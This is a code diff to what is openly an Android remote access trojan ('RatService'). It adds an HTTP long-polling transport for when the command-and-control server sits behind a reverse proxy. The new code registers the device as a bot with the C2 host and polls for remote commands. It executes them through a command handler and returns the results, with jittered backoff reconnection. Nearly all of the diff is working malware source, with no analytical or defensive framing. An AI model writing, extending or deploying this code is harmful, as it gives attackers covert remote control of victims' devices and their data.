@@ -183,6 +183,94 @@ public class RatService extends Service implements RatEventSink {
         return true;
     }
 
+    /**
+     * The HTTP long-polling client loop.
+     *
+     * Used when the C2 is behind a reverse proxy on shared hosting and no
+     * raw TCP port can be bound. The protocol is the same; only the framing
+     * around the frames differs.
+     */
+    private void httpClientLoop() {
+        Random rnd = new Random();
+        long backoff = RatCfg.BEACON_INTERVAL_MS;
+        int pollTimeout = Math.max(5, (RatCfg.BEACON_INTERVAL_MS / 1000) + 5);
+
+        while (running.get()) {
+            RatHttp http = new RatHttp(RatCfg.C2_HOST);
+            try {
+                Map<String, Object> reg = RatCommands.registerPayload(this);
+                if (!http.register(reg)) {
+                    throw new IOException("registration rejected");
+                }
+                RatLog.i("registered over HTTP: " + http.botId());
+                backoff = RatCfg.BEACON_INTERVAL_MS;
+
+                while (running.get()) {
+                    RatHttp.Frame f = http.poll(pollTimeout);
+                    if (f == null) {
+                        continue;           // nothing to do, poll again
+                    }
+                    if (f.type == RatProto.TYPE_PING) {
+                        http.send(RatProto.TYPE_PONG, f.payload);
+                        continue;
+                    }
+                    if (f.type == RatProto.TYPE_PONG) {
+                        continue;
+                    }
+                    if (f.type == RatProto.TYPE_COMMAND) {
+                        handleHttpCommand(http, f.payload);
+                        continue;
+                    }
+                    RatLog.w("unknown frame type: 0x" + Integer.toHexString(f.type & 0xff));
+                }
+            } catch (Throwable t) {
+                RatLog.w("link error: " + t.getClass().getSimpleName() + ": " + t.getMessage());
+            }
+
+            if (!running.get()) {
+                break;
+            }
+            long jitter = (long) (backoff * 0.4 * (rnd.nextDouble() * 2.0 - 1.0));
+            long sleep = Math.max(1000L, backoff + jitter);
+            RatLog.i("reconnecting in " + sleep + " ms");
+            try {
+                Thread.sleep(sleep);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                break;
+            }
+            backoff = Math.min(backoff * 2, 5 * 60 * 1000L);
+        }
+        RatLog.i("client loop stopped");
+    }
+
+    /** Executes one command that arrived over HTTP and sends the result back. */
+    private void handleHttpCommand(RatHttp http, byte[] payload) {
+        String cmdId = "";
+        try {
+            Map<String, Object> args = RatJson.decodeObject(new String(payload, "UTF-8"));
+            cmdId = RatJson.getString(args, "id", "");
+            String cmd = RatJson.getString(args, "cmd", "");
+
+            RatLog.i("command: " + cmd + " (id=" + cmdId + ")");
+
+            Map<String, Object> out = RatCommands.handle(this, cmdId, args);
+            out.put("id", cmdId);
+            out.put("cmd", cmd);
+            http.send(RatProto.TYPE_RESPONSE, RatJson.encode(out).getBytes("UTF-8"));
+        } catch (Throwable t) {
+            Map<String, Object> out = new java.util.LinkedHashMap<String, Object>();
+            out.put("ok", false);
+            out.put("id", cmdId);
+            out.put("error", t.getClass().getSimpleName() + ": " + String.valueOf(t.getMessage()));
+            try {
+                http.send(RatProto.TYPE_RESPONSE, RatJson.encode(out).getBytes("UTF-8"));
+            } catch (IOException ignored) {
+                // the link is gone; the loop will reconnect
+            }
+        }
+    }
+
     /** Single cleanup path for both normal stop and init failure. */
     private void cleanup() {
         running.set(false);
@@ -202,6 +290,10 @@ public class RatService extends Service implements RatEventSink {
     // ------------------------------------------------------------------
 
     private void clientLoop() {
+        if ("http".equalsIgnoreCase(RatCfg.TRANSPORT)) {
+            httpClientLoop();
+            return;
+        }
         Random rnd = new Random();
         long backoff = RatCfg.BEACON_INTERVAL_MS;
 
